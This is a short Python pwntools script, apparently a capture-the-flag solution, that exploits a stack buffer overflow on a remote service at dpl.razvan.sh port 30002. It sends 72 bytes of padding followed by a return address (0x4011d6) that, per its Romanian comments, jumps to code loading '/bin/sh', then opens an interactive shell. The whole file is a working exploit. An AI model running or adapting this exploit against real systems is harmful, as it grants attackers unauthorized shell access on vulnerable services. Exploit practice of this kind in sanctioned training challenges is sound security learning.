#!/usr/bin/env python3
from pwn import *

def exploit():
    p = remote('dpl.razvan.sh', 30002)
    p.recvuntil(b"Show me what you got\n")
    
    offset = 72
    
    # Încearcă să sari direct la instrucțiunea care încarcă /bin/sh
    # 0x4011d6 - unde se încarcă adresa string-ului "/bin/sh"
    jump_to_system = 0x4011d6
    
    payload = b'A' * offset
    payload += p64(jump_to_system)
    
    p.sendline(payload)
    p.interactive()

exploit()
